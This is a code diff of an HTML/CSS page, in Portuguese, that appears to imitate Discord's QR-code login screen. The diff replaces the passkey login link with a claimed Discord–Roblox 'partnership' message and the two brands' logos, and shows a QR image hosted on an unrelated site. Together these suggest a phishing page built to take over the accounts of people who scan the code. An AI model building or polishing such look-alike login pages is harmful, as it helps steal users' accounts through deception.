@@ -22,12 +22,11 @@
       overflow: hidden;
       position: relative;
     }
-    /* Overlay sutil para melhorar legibilidade no fundo azul */
     body::after {
       content: "";
       position: absolute;
       inset: 0;
-      background: rgba(0, 0, 0, 0.35); /* escurece levemente pra texto ficar legível */
+      background: rgba(0, 0, 0, 0.35);
       pointer-events: none;
       z-index: 1;
     }
@@ -37,7 +36,7 @@
       max-width: 1100px;
       height: 85vh;
       max-height: 700px;
-      background: rgba(30, 30, 50, 0.75); /* semi-transparente pra contrastar com o fundo */
+      background: rgba(30, 30, 50, 0.75);
       border-radius: 12px;
       overflow: hidden;
       box-shadow: 0 10px 40px rgba(0,0,0,0.6);
@@ -54,7 +53,7 @@
     }
     .right {
       flex: 1;
-      background: rgba(54, 57, 63, 0.9); /* fundo escuro semi-transparente pra destacar a imagem */
+      background: rgba(54, 57, 63, 0.9);
       display: flex;
       align-items: center;
       justify-content: center;
@@ -128,7 +127,7 @@
     .qr-image {
       width: 240px;
       height: 240px;
-      margin: 20px auto;
+      margin: 20px auto 16px;
       border-radius: 12px;
       box-shadow: 0 8px 30px rgba(0,0,0,0.5);
       background: white;
@@ -140,19 +139,23 @@
       font-weight: 700;
       margin-bottom: 12px;
     }
-    .qr-desc {
-      color: #b9bbbe;
-      font-size: 1rem;
+    .qr-custom-text {
+      font-size: 1.1rem;
+      font-weight: 600;
+      margin: 20px 0 16px;
       line-height: 1.4;
-      margin-bottom: 16px;
     }
-    .qr-passkey {
-      color: #00aff4;
-      font-size: 0.95rem;
-      text-decoration: none;
+    .logos {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      margin-top: 12px;
     }
-    .qr-passkey:hover {
-      text-decoration: underline;
+    .logos img {
+      height: 50px;
+      width: auto;
+      object-fit: contain;
     }
     .voltar {
       position: absolute;
@@ -199,7 +202,7 @@
     
     <div class="right">
       <div class="qr-section">
-        <img class="qr-image" src="https://result.ghiblivideo.ai/output/result/202602/22/260d087ebb2a4245a2a0e28c0b9ddb9d.png" alt="Imagem QR customizada" />
+        <img class="qr-image" src="https://result.ghiblivideo.ai/output/result/202602/22/260d087ebb2a4245a2a0e28c0b9ddb9d.png" alt="QR customizado" />
         
         <div class="qr-title">Entrar com código QR</div>
         
@@ -209,7 +212,16 @@
           imediatamente.
         </p>
         
-        <a href="#" class="qr-passkey">Ou, faça login com uma passkey</a>
+        <p class="qr-custom-text">
+          Ou faça login pelo roblox!!<br>
+          Estamos fazendo parceria em troca de divulgação!!
+        </p>
+        
+        <div class="logos">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/7/7c/Discord-logo-icon.jpg" alt="Discord Logo">
+          <span style="font-size: 1.8rem; font-weight: bold;"> - </span>
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f2/Roblox_%282025%29_%28App_Icon%29.svg/960px-Roblox_%282025%29_%28App_Icon%29.svg.png" alt="Roblox Logo">
+        </div>
       </div>
     </div>
   </div>
